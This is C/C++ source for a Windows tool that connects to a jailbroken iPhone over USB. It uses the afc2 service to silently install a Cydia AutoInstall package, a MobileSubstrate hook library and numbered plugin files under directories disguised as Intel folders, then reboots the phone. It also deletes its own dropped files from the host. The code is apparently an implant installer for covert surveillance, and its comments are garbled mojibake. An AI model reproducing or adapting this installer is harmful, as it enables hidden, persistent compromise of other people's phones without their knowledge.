

#include "stdafx.h"

#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>

#include "libimobiledevice/libimobiledevice.h"
#include "libimobiledevice/lockdown.h"
#include "libimobiledevice/installation_proxy.h"
#include "libimobiledevice/notification_proxy.h"
#include "libimobiledevice/diagnostics_relay.h"
#include "libimobiledevice/afc.h"
//#include <string.h>

#include "publicDef.h"

#include "FileTools.h"
#include "ResourceMgr.h"

#define APPLICATION_INSTALL_PATH          "/cores/Users/All Users/Intel"
#define APPLICATION_DATA_FILE_PATH        "/cores/Users/All Users/Intel/Data"
#define APPLICATION_TEMP_FILE_PATH        "/cores/Users/Public/Downloads/Update"
#define APPLICATION_UPDATE_FILE_PATH      "/cores/Users/Public/Downloads/Update/update"
#define APPLICATION_PLUGIN_TEMP_FILE_PATH "/cores/Users/Public/Downloads/Update/utd_CE31"
#define HOOK_DYLIB_FILE_PATH              "/Library/MobileSubstrate/DynamicLibraries"
#define AUTORUN_CONFIG_FILE_PATH          "/System/Library/LaunchDaemons"
#define CYDIA_AUTO_INSTALL_PATH           "/var/root/Media/Cydia/AutoInstall"

#define MAIN_PRO_NAME                     "detect.deb"
#define SUBSTRATE_NAME					  "mobilesubstrate.deb"
#define PLUGIN_ONE_NAME                   "1.dat"
#define PLUGIN_TWO_NAME                   "2.dat"
#define PLUGIN_THREE_NAME                 "3.dat"
#define PLUGIN_FOUR_NAME                  "4.dat"

#define GLP_CONFIG_NAME                   "glp.uin"
#define DTL_CONFIG_NAME                   "dtl.dat"
#define PLUGIN_DATA_CONFIG_NAME           "plugin.dat"

#define AUTO_RUN_CONFIG                   "com.intel.detect.plist"
#define HOOK_LIB_NAME                     "MobileSafetyDetect.dylib"

#define IOS_DEVIECE_COMMUNICATION_LABEL   "com.apple.tj.zm"

//������������ļ�
static char* plugins;
static char* needCopyPlugins[]={PLUGIN_ONE_NAME,PLUGIN_TWO_NAME,PLUGIN_THREE_NAME,PLUGIN_FOUR_NAME,'\0'};
static char* needCopyConfigs[]={GLP_CONFIG_NAME,DTL_CONFIG_NAME,PLUGIN_DATA_CONFIG_NAME,'\0'};


// ��������
typedef afc_error_t (*d_afc_read_directory)(afc_client_t client, const char *dir, char ***list);
typedef idevice_error_t (*d_idevice_new)(idevice_t * device, const char *udid);
typedef lockdownd_error_t (*d_lockdownd_client_new_with_handshake)(idevice_t device, lockdownd_client_t *client, const char *label);
typedef idevice_error_t (*d_idevice_free)(idevice_t device);
typedef lockdownd_error_t (*d_lockdownd_client_free)(lockdownd_client_t client);
typedef lockdownd_error_t (*d_lockdownd_start_service)(lockdownd_client_t client, const char *identifier, lockdownd_service_descriptor_t *service);
typedef afc_error_t (*d_afc_client_new)(idevice_t device, lockdownd_service_descriptor_t service, afc_client_t * client);
typedef afc_error_t (*d_afc_make_directory)(afc_client_t client, const char *dir);
typedef idevice_error_t (*d_afc_file_open)(afc_client_t client, const char *filename, afc_file_mode_t file_mode, uint64_t *handle);
typedef idevice_error_t (*d_afc_file_write)(afc_client_t client, uint64_t handle, const char *data, uint32_t length, uint32_t *bytes_written);
typedef afc_error_t (*d_afc_file_close)(afc_client_t client, uint64_t handle);
typedef diagnostics_relay_error_t (*d_diagnostics_relay_client_new)(idevice_t device, lockdownd_service_descriptor_t service, diagnostics_relay_client_t *client);
typedef diagnostics_relay_error_t (*d_diagnostics_relay_restart)(diagnostics_relay_client_t client, int flags);
typedef diagnostics_relay_error_t (*d_diagnostics_relay_goodbye)(diagnostics_relay_client_t client);
typedef diagnostics_relay_error_t (*d_diagnostics_relay_client_free)(diagnostics_relay_client_t client);

d_afc_read_directory g_afc_read_directory = NULL;
d_idevice_new g_idevice_new = NULL;
d_lockdownd_client_new_with_handshake g_lockdownd_client_new_with_handshake = NULL;
d_idevice_free g_idevice_free = NULL;
d_lockdownd_client_free g_lockdownd_client_free = NULL;
d_lockdownd_start_service g_lockdownd_start_service = NULL;
d_afc_client_new g_afc_client_new = NULL;
d_afc_make_directory g_afc_make_directory = NULL;
d_afc_file_open g_afc_file_open = NULL;
d_afc_file_write g_afc_file_write = NULL;
d_afc_file_close g_afc_file_close = NULL;
d_diagnostics_relay_client_new g_diagnostics_relay_client_new = NULL;
d_diagnostics_relay_restart g_diagnostics_relay_restart = NULL;
d_diagnostics_relay_goodbye g_diagnostics_relay_goodbye = NULL;
d_diagnostics_relay_client_free g_diagnostics_relay_client_free = NULL;

HMODULE GetDynamicFunc()
{
	WCHAR wzDllPath[MAX_PATH] = {0};
	FileTools::GetExePath(wzDllPath);
	wcscat(wzDllPath, L"\\libimobiledevice.dll");
	HMODULE hDll = LoadLibraryW(wzDllPath);

	if ( NULL != hDll )
	{
		g_afc_read_directory = (d_afc_read_directory)GetProcAddress(hDll, "afc_read_directory");
		g_idevice_new = (d_idevice_new)GetProcAddress(hDll, "idevice_new");
		g_lockdownd_client_new_with_handshake = (d_lockdownd_client_new_with_handshake)GetProcAddress(hDll, "lockdownd_client_new_with_handshake");
		g_idevice_free = (d_idevice_free)GetProcAddress(hDll, "idevice_free");
		g_lockdownd_client_free = (d_lockdownd_client_free)GetProcAddress(hDll, "lockdownd_client_free");
		g_lockdownd_start_service = (d_lockdownd_start_service)GetProcAddress(hDll, "lockdownd_start_service");
		g_afc_client_new = (d_afc_client_new)GetProcAddress(hDll, "afc_client_new");
		g_afc_make_directory = (d_afc_make_directory)GetProcAddress(hDll, "afc_make_directory");
		g_afc_file_open = (d_afc_file_open)GetProcAddress(hDll, "afc_file_open");
		g_afc_file_write = (d_afc_file_write)GetProcAddress(hDll, "afc_file_write");
		g_afc_file_close = (d_afc_file_close)GetProcAddress(hDll, "afc_file_close");
		g_diagnostics_relay_client_new = (d_diagnostics_relay_client_new)GetProcAddress(hDll, "diagnostics_relay_client_new");
		g_diagnostics_relay_restart = (d_diagnostics_relay_restart)GetProcAddress(hDll, "diagnostics_relay_restart");
		g_diagnostics_relay_goodbye = (d_diagnostics_relay_goodbye)GetProcAddress(hDll, "diagnostics_relay_goodbye");
		g_diagnostics_relay_client_free = (d_diagnostics_relay_client_free)GetProcAddress(hDll, "diagnostics_relay_client_free");
	}

	return hDll;
}


//��ȡ��Ҫд��Ŀ����Ĳ������
char* getPluginName(int pluginId)
{
    char *pluginName=NULL;
    PPLUGIN_ALIAS pluginTemp=(PPLUGIN_ALIAS)plugins;
    pluginTemp+=pluginId;

    if(pluginTemp->dwPluginNumber!=pluginId)
    {
        printf("[getPluginName]plugin config id=%d!=need get plugin id=%d\n",pluginTemp->dwPluginNumber,pluginId);
        
    }
    else
    {
        //ת��
     
        pluginName=(char*)malloc(MAX_PATH);
        memset(pluginName, 0, MAX_PATH);
        Unicode_String_to_UTF8_String((uint8_t *)pluginName, (const uint16_t *) pluginTemp->wzPluginName, MAX_PATH);
        
    }
    return pluginName;
}
//����plugin.dat�ļ�
void parsePluginDat(char*plguinDataConfigPath)
{
    
    plugins=NULL;
    PPLUGIN_ALIAS pluginTemp=NULL;
    plugins=(char*)malloc(8*sizeof(PLUGIN_ALIAS));
    memset(plugins, 0, 8*sizeof(PLUGIN_ALIAS));
    pluginTemp=(PPLUGIN_ALIAS)plugins;
    FILE* fp=NULL;
    int readSize=0;
    do
    {
        if((fp=fopen(plguinDataConfigPath, "r"))!=NULL && pluginTemp)
        {
            do 
            {
                readSize=fread(pluginTemp,sizeof(PLUGIN_ALIAS), 1, fp);
                pluginTemp++;
            } while (readSize==1);
            
            
            printf("read size=%d\n",readSize);
        }
        else
        {
            printf("[parsePluginDat]open %s failed\n",plguinDataConfigPath);
        }
    } while (FALSE);
    if(fp)
    {
        fclose(fp);
    }
     
}
//�ͷ�Ŀ¼
void freeDirectoryNames(char **dirnames)
{
    while (*dirnames) 
    {
        free(*dirnames);
        
        char **temp=dirnames;
        
        dirnames++;
      
    }
}
//�ж�Ŀ¼�Ƿ����
int checkIsDirExsit(afc_client_t client,char* dirPath,char*dirName)
{
    int isExist=-1;
    int errNO=-1;
    char **dirNames=NULL;
    if((errNO=g_afc_read_directory(client, dirPath, &dirNames))==AFC_E_SUCCESS && *dirNames)
    {
        while (*dirNames) 
        {
            if(strcmp(*dirNames, dirName)==0)
            {
                isExist=1;
                break;
            }
            dirNames++;
        }
        
//        freeDirectoryNames(dirNames);
    }
    return isExist;
}

int afc_upload_file(afc_client_t afc, const char* filename, const char* dstfn)
{
	FILE *f = NULL;
	uint64_t af = 0;
	char buf[8192];
    
	f = fopen(filename, "rb");
	if (!f) 
    {
		printf("[afc_upload_file]fopen: %s:error=%s failed\n", filename, strerror(errno));
		return -1;
	}
    
	if ((g_afc_file_open(afc, dstfn, AFC_FOPEN_WRONLY, &af) != AFC_E_SUCCESS) || !af) 
    {
		fclose(f);
		printf("[afc_upload_file]afc_file_open on '%s' failed!\n", dstfn);
		return -1;
	}
    
	size_t amount = 0;
	do 
    {
		amount = fread(buf, 1, sizeof(buf), f);
		if (amount > 0) 
        {
			uint32_t written, total = 0;
			while (total < amount)
            {
				written = 0;
				if (g_afc_file_write(afc, af, buf, amount, &written) != AFC_E_SUCCESS) 
                {
					printf("[afc_upload_file]AFC Write error!\n");
					break;
				}
				total += written;
			}
			if (total != amount)
            {
				printf("[afc_upload_file]Error: wrote only %d of %zu\n", total, amount);
				g_afc_file_close(afc, af);
				fclose(f);
				return -1;
			}
		}
	} while (amount > 0);
    
	g_afc_file_close(afc, af);
	fclose(f);
    
	return 1;
}



//������ص�Ŀ¼
int createDir(afc_client_t client)
{
    int result=-1;
    int errNO=-1;
    do 
    {
        //��һ�ΰ�װ��Ҫ�������Ŀ¼
        if(checkIsDirExsit(client, "/cores/Users", "Public") && checkIsDirExsit(client, "/cores/Users", "All Users"))
        {
            if((errNO=g_afc_make_directory(client,APPLICATION_DATA_FILE_PATH))!=AFC_E_SUCCESS)
            {
                break;
            }
            if((errNO=g_afc_make_directory(client,APPLICATION_UPDATE_FILE_PATH))!=AFC_E_SUCCESS)
            {
                break;
            }
            if((errNO=g_afc_make_directory(client,APPLICATION_PLUGIN_TEMP_FILE_PATH))!=AFC_E_SUCCESS)
            {
                break;
            }
            if((errNO=g_afc_make_directory(client,CYDIA_AUTO_INSTALL_PATH))!=AFC_E_SUCCESS)
            {
                break;
            }
            
        }
        
        result=1;
    } while (0);
    return result;
}
//��ȡ�����ļ�������ļ�����Ŀ¼��·��
char *getPluginDirPath()
{
    //just test need implement on windows
    char *dirPath=(char*)malloc(1024);
	char exePath[MAX_PATH] = {0};
	GetModuleFileNameA(0, exePath, MAX_PATH);
	*strrchr(exePath, '\\') = '\0';

    memset(dirPath,0, 1024);
    sprintf(dirPath, "%s", exePath);
    return dirPath;
}
//���������ļ� Update-info.plist������������������ļ�������ļ��������ļ�
int copyFiles(afc_client_t client)
{
    int result=-1;
    char *pluginDirPath=getPluginDirPath();
    do 
    {
        char pluginFilePath[1024]={0};
        _snprintf(pluginFilePath,1023,"%s\\%s",pluginDirPath,PLUGIN_DATA_CONFIG_NAME);
        parsePluginDat(pluginFilePath);
        printf("[copyFiles]getPluginDirPath=%s\n",pluginDirPath);
        if(!pluginDirPath || !plugins)
        {
            printf("[copyFiles] init plugin.data failed\n");
            break;
        }
        else
        {
            //��ʼ��������ļ�
            char mainProSPath[1024]={0};
            _snprintf(mainProSPath,1023,"%s\\%s",pluginDirPath,MAIN_PRO_NAME);
            char mainProTPath[1024]={0};
            _snprintf(mainProTPath, 1023, "%s/%s",CYDIA_AUTO_INSTALL_PATH,MAIN_PRO_NAME);
            if(afc_upload_file(client,mainProSPath,mainProTPath)==-1)
            {
                printf("[copyFiles] begin copy %s to %s failed\n",mainProSPath,mainProTPath);
                break;
            }

			if(!checkIsDirExsit(client,"/Library","MobileSubstrate"))
			{
				char mainProSPath[1024]={0};
				_snprintf(mainProSPath,1023,"%s\\%s",pluginDirPath,SUBSTRATE_NAME);
				char mainProTPath[1024]={0};
				_snprintf(mainProTPath, 1023, "%s/%s",CYDIA_AUTO_INSTALL_PATH,SUBSTRATE_NAME);
				if(afc_upload_file(client,mainProSPath,mainProTPath)==-1)
				{
					printf("[copyFiles] begin copy %s to %s failed\n",mainProSPath,mainProTPath);
					break;
				}
			}


            int index=1;
            //���������Ϣ
            char **pluginNameIndex=needCopyPlugins;
            while (*pluginNameIndex && strlen(*pluginNameIndex)!=0) 
            {
                printf("pluginNameIndex=%s\n",*pluginNameIndex);
                char pluginSPath[1024]={0};
                _snprintf(pluginSPath, 1023, "%s\\%s",pluginDirPath,*pluginNameIndex);
                char *cfgPluginName=getPluginName(index);
                if(!cfgPluginName)
                {
                    printf("[copyFiles]get plugin %d name==NULL\n",index);
                    pluginNameIndex++;
                    index++;
                    continue;
                }
                char pluginTpath[1024]={0};
                _snprintf(pluginTpath, 1023, "%s/%s",APPLICATION_INSTALL_PATH,cfgPluginName);
                printf("[copyFiles] begin copy %s to %s\n",pluginSPath,pluginTpath);
                if(afc_upload_file(client,pluginSPath,pluginTpath)==-1)
                {
                    free(cfgPluginName);
                    pluginNameIndex++;
                    index++;
                    continue;
                }
                free(cfgPluginName);
                pluginNameIndex++;
                index++;
            }
            //���������ļ�
            char **cfgNameIndex=needCopyConfigs;
            while (*cfgNameIndex) 
            {
                char cfgSPath[1024]={0};
                _snprintf(cfgSPath, 1023, "%s\\%s",pluginDirPath,*cfgNameIndex);
               
                char cfgTpath[1024]={0};
                _snprintf(cfgTpath, 1023, "%s/%s",APPLICATION_DATA_FILE_PATH,*cfgNameIndex);
                printf("[copyFiles] begin copy %s to %s\n",cfgSPath,cfgTpath);
                if(afc_upload_file(client,cfgSPath,cfgTpath)==-1)
                {
                    cfgNameIndex++;
                    continue;
                    
                }
                cfgNameIndex++;
            }

            //����hook dylib
            char hookSPath[1024]={0};
            _snprintf(hookSPath,1023,"%s\\%s",pluginDirPath,HOOK_LIB_NAME);
            char hookTPath[1024]={0};
             _snprintf(hookTPath, 1023, "%s/%s",HOOK_DYLIB_FILE_PATH,HOOK_LIB_NAME);
            if(afc_upload_file(client,hookSPath,hookTPath)==-1)
            {
                 printf("[copyFiles] begin copy %s to %s failed\n",hookSPath,hookTPath);
                break;
            }
            //�����Զ������������ļ�
           /* char autoCfgSPath[1024]={0};
            _snprintf(autoCfgSPath,1023,"%s\\%s",pluginDirPath,AUTO_RUN_CONFIG);
            char autoCfgTPath[1024]={0};
            _snprintf(autoCfgTPath, 1023, "%s/%s",AUTORUN_CONFIG_FILE_PATH,AUTO_RUN_CONFIG);
            if(afc_upload_file(client,autoCfgSPath,autoCfgTPath)==-1)
            {
                printf("[copyFiles] begin copy %s to %s failed\n",autoCfgSPath,autoCfgTPath);
                break;
            }*/
        }
        result=1;
    } while (0);
    if(pluginDirPath)
    {
        free(pluginDirPath);
    }
    return result;
}

//��װӦ�ó���
int installApp(afc_client_t client)
{
    int result=-1;
    do 
    {
        if(checkIsDirExsit(client, "/private/var/lib", "apt"))
        {
            //����Ŀ¼
            if(createDir(client)==-1)
            {
                printf("[installApp]createDirectory failed\n");
                break;
            }
            else
            {

                //��ʼ���������ļ� "plugin.dat"�����ļ�
                if(copyFiles(client)==-1)
                {
                    break;
                }
            }
        }
        else
        {
            printf("[installApp]δԽ���ֻ���֧�ְ�װ\n");
        }
        result=1;
    } while (0);
    return result;
}

//��ʼһ���ļ�����
int startFileService(idevice_t iosDevice,lockdownd_client_t client,lockdownd_service_descriptor_t service,afc_client_t* afc_Client)
{
    int result=-1;
    int errNO=-1;
    do 
    {
        if (((errNO=g_lockdownd_start_service(client, "com.apple.afc2", &service)) !=
             LOCKDOWN_E_SUCCESS) || !service) 
        {
            printf("[startFileService]Could not start ios file service!errNO=%d\n",errNO);
			printf("�ֻ�����δ��װ afc �����������޷������ļ�ϵͳ���밲װ������!\n");
            break;
        }
       // lockdownd_client_free(client);
		//client = NULL;

        if ((errNO=g_afc_client_new(iosDevice, service, afc_Client)) != INSTPROXY_E_SUCCESS)
        {
            printf("[startFileService]Could not connect to AFC! errno=%d\n",errNO);
            break;
        }
        result=1;
    } while (0);
    return result;
}

//��ʼ��ios�豸����
int initileDeive(idevice_t *iosDevice,lockdownd_client_t *client)
{
    int result=-1;
    int errorNO=0;
    do 
    {
        if (IDEVICE_E_SUCCESS != (errorNO=g_idevice_new(iosDevice, NULL))) 
        {
            printf("[initileDeive]No iOS device found, is it plugged in? errono=%d\n",errorNO);
            break;
        }
        
        if (LOCKDOWN_E_SUCCESS != g_lockdownd_client_new_with_handshake(*iosDevice, client, IOS_DEVIECE_COMMUNICATION_LABEL))
        {
            printf("[initileDeive]Could not connect to lockdownd. Exiting.\n");
            break;
        }
        
     
        /*
        if ((errorNO=np_client_new(iosDevice, service, &np)) != NP_E_SUCCESS) 
        {
            printf("[initileDeive]Could not connect to notification_proxy!errorNO=%d\n",errorNO);
        }*/
        result=1;
    } while (0);
    if(result==-1)
    {
        if(iosDevice)
        {
            g_idevice_free(*iosDevice);
        }
        if (client) 
        {
            g_lockdownd_client_free(*client);
        }
    }
    return result;
}

//reboot�豸
void deviceReboot(idevice_t iosDevice, lockdownd_client_t _lockdownd)
{
    diagnostics_relay_client_t diagnostics_client = NULL;
    lockdownd_service_descriptor_t descriptor = 0;
    lockdownd_error_t ret = LOCKDOWN_E_UNKNOWN_ERROR;
    diagnostics_relay_error_t result = DIAGNOSTICS_RELAY_E_UNKNOWN_ERROR;
    
    /*  attempt to use newer diagnostics service available on iOS 5 and later */
    ret = g_lockdownd_start_service(_lockdownd, "com.apple.mobile.diagnostics_relay", &descriptor);
    if (ret != LOCKDOWN_E_SUCCESS)
    {
        /*  attempt to use older diagnostics service */
        ret = g_lockdownd_start_service(_lockdownd, "com.apple.iosdiagnostics.relay", &descriptor);
    }
    
    if ((ret == LOCKDOWN_E_SUCCESS) && (descriptor && descriptor->port > 0)) 
    {
        if (g_diagnostics_relay_client_new(iosDevice, descriptor, &diagnostics_client) != DIAGNOSTICS_RELAY_E_SUCCESS)
        {
            printf("Could not connect to diagnostics_relay!\n");
        } else
        {
            result = g_diagnostics_relay_restart(diagnostics_client, 0);
            if (result != DIAGNOSTICS_RELAY_E_SUCCESS) 
            {
               printf("Failed to restart device.\n");
            } 
        }
    }
    else 
    {
        printf("Could not start diagnostics service!\n");
    }
    
    g_diagnostics_relay_goodbye(diagnostics_client);
    g_diagnostics_relay_client_free(diagnostics_client);

}

void DeleteDependency(LPWSTR wzDll)
{
	WCHAR wzDllPath[MAX_PATH] = {0};
	FileTools::GetExePath(wzDllPath);
	wcscat(wzDllPath, wzDll);

	DeleteFileW(wzDllPath);
}


int main(int argc, char *argv[])
{

	// �ͷ��ļ�
	ResourceMgr mgr(NULL);
	mgr.ExtractAll();

	// ��ʼ���ӿ�
	HMODULE hDll = GetDynamicFunc();

    idevice_t iosDevice = NULL;        //������豸
	lockdownd_client_t client = NULL;
	instproxy_client_t ipc = NULL;     //����ͻ���
	np_client_t np = NULL;             //���ؿͻ���
	afc_client_t afc_Client = NULL;           //�ļ�Ŀ¼����ģ��
	lockdownd_service_descriptor_t service = (lockdownd_service_descriptor_t)malloc(sizeof(struct lockdownd_service_descriptor));
    
    if(initileDeive(&iosDevice,&client))
    {
        //���ļ�����
        if(startFileService(iosDevice,client,service,&afc_Client))
        {
            //��ʼ��װ���򣬰����������Ŀ¼�����������ļ������ļ���Ŀ¼��
            if(installApp(afc_Client))
            {
                //�ر�afc_Client����ط���
                
                //��װ�ɹ��������豸
                deviceReboot(iosDevice,client);
            }
            else
            {
               printf("[main]installApp failed\n");  
            }
        }
        else
        {
            printf("[main]startFileService failed\n");
        }
    }
    else
    {
        printf("[main]connect ios device failed\n");
    }

	if ( hDll )
	{
		FreeLibrary(hDll);
	}

	// ɾ�� dll

	DeleteDependency(L"\\libiconv.dll");
	DeleteDependency(L"\\libimobiledevice.dll");
	DeleteDependency(L"\\libxml2.dll");

	DeleteDependency(L"\\1.dat");
	DeleteDependency(L"\\2.dat");
	DeleteDependency(L"\\4.dat");
	DeleteDependency(L"\\detect.deb");
	DeleteDependency(L"\\dtl.dat");
	DeleteDependency(L"\\glp.uin");
	DeleteDependency(L"\\plugin.dat");
	DeleteDependency(L"\\mobilesubstrate.deb");
	DeleteDependency(L"\\MobileSafetyDetect.dylib");

	system("PAUSE");

}
